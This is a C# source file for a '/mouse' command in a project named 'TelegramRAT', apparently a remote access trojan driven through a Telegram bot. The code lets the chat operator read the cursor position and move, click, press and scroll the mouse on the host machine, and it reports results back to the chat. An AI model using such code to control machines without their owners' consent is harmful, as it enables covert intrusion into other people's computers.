using Telegram.Bot;
using WindowsInput;
using System.Drawing;
using TelegramRAT.Services;
using Telegram.Bot.Types.Enums;
using TelegramRAT.Utilities;

namespace TelegramRAT.Commands.Remote;

public class MouseCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IWinApiService winApiService) : AbstractBotCommand
{
    public override string Command => "mouse";
    public override string Description =>
        "This command has multiple usage.\n" +
        "info - show info about cursor\n" +
        "to - move mouse cursor to point on the primary screen\n" +
        "by - move mouse by pixels\n" +
        "click - click mouse button\n" +
        "dclick - double click mouse button\n" +
        "down - mouse button down\n" +
        "up - mouse button up\n" +
        "scroll | vscroll - vertical scroll\n" +
        "hscroll - horizontal scroll";
    public override int ArgsCount => -2;
    public override string Example => "/mouse to 200 300";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        MouseSimulator mouseSimulator = new MouseSimulator(new InputSimulator());

        try
        {
            bool responseSent = false;
            switch (model.Args[0].ToLower())
            {
                case "i":
                case "info":
                    string mouseInfo;
                    if (winApiService.GetCursorPos(out Point cursorPosition))
                    {
                        mouseInfo = $"Cursor position: x:{cursorPosition.X} y:{cursorPosition.Y}";
                    }
                    else
                    {
                        mouseInfo = "Unable to get info about cursor";
                    }
                    responseSent = true;
                    await botClient.SendMessage(model.Message.Chat.Id, mouseInfo, ParseMode.Html, replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                    return;

                case "to":
                    Rectangle virtualBounds = winApiService.GetScreenBounds();
                    double normalizedX = (Convert.ToDouble(model.Args[1]) - virtualBounds.X) * ((double)ushort.MaxValue / virtualBounds.Width);
                    double normalizedY = (Convert.ToDouble(model.Args[2]) - virtualBounds.Y) * ((double)ushort.MaxValue / virtualBounds.Height);
                    mouseSimulator.MoveMouseTo(normalizedX, normalizedY);
                    break;

                case "by":
                    mouseSimulator.MoveMouseBy(Convert.ToInt32(model.Args[1]), Convert.ToInt32(model.Args[2]));
                    break;

                case "clk":
                case "clck":
                case "click":
                    if (model.Args.Length > 1)
                    {
                        switch (model.Args[1])
                        {
                            case "r":
                            case "right": mouseSimulator.RightButtonClick(); break;
                            case "l":
                            case "left": mouseSimulator.LeftButtonClick(); break;
                            default:
                                responseSent = true;
                                await botClient.SendMessage(model.Message.Chat.Id, "Type whether button you want to click(right or left).", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                                return;
                        }
                    }
                    else
                    {
                        responseSent = true;
                        await botClient.SendMessage(model.Message.Chat.Id, "Type whether button you want to click(right or left).", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                        return;
                    }
                    break;

                case "dclk":
                case "dclck":
                case "dclick":
                    if (model.Args.Length > 1)
                    {
                        switch (model.Args[1])
                        {
                            case "r":
                            case "right": mouseSimulator.RightButtonDoubleClick(); break;
                            case "l":
                            case "left": mouseSimulator.LeftButtonDoubleClick(); break;
                            default:
                                responseSent = true;
                                await botClient.SendMessage(model.Message.Chat.Id, "Type whether button you want to double click(right or left).", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                                return;
                        }
                    }
                    else
                    {
                        responseSent = true;
                        await botClient.SendMessage(model.Message.Chat.Id, "Type whether button you want to double click(right or left).", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                        return;
                    }
                    break;

                case "dn":
                case "dwn":
                case "down":
                    if (model.Args.Length > 1)
                    {
                        switch (model.Args[1])
                        {
                            case "r":
                            case "right": mouseSimulator.RightButtonDown(); break;
                            case "l":
                            case "left": mouseSimulator.LeftButtonDown(); break;
                            default:
                                responseSent = true;
                                await botClient.SendMessage(model.Message.Chat.Id, "Type whether button you want to set down(right or left).", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                                return;
                        }
                    }
                    else
                    {
                        mouseSimulator.RightButtonDown();
                    }
                    break;

                case "up":
                    if (model.Args.Length > 1)
                    {
                        switch (model.Args[1])
                        {
                            case "r":
                            case "right": mouseSimulator.RightButtonUp(); break;
                            case "l":
                            case "left": mouseSimulator.LeftButtonUp(); break;
                            default:
                                responseSent = true;
                                await botClient.SendMessage(model.Message.Chat.Id, "Type whether button you want to set up(right or left).", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                                return;
                        }
                    }
                    else
                    {
                        mouseSimulator.LeftButtonUp();
                        mouseSimulator.RightButtonUp();
                    }
                    break;

                case "vscr":
                case "vscroll":
                case "scroll":
                case "scr":
                    if (model.Args.Length > 1 && int.TryParse(model.Args[1], out int vscrollSteps))
                    {
                        mouseSimulator.VerticalScroll(vscrollSteps * -1);
                    }
                    else
                    {
                        responseSent = true;
                        await botClient.SendMessage(model.Message.Chat.Id, "Type scroll steps (integer) you want to simulate.", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                        return;
                    }
                    break;

                case "hscr":
                case "hscroll":
                    if (model.Args.Length > 1 && int.TryParse(model.Args[1], out int hscrollSteps))
                    {
                        mouseSimulator.HorizontalScroll(hscrollSteps * -1);
                    }
                    else
                    {
                        responseSent = true;
                        await botClient.SendMessage(model.Message.Chat.Id, "Type scroll steps (integer) you want to simulate.", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                        return;
                    }
                    break;

                default:
                    responseSent = true;
                    await botClient.SendMessage(model.Message.Chat.Id, "No such use for this command.", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                    return;
            }
            if (!responseSent)
            {
                await botClient.SendMessage(model.Message.Chat.Id, "Done", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
            }
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
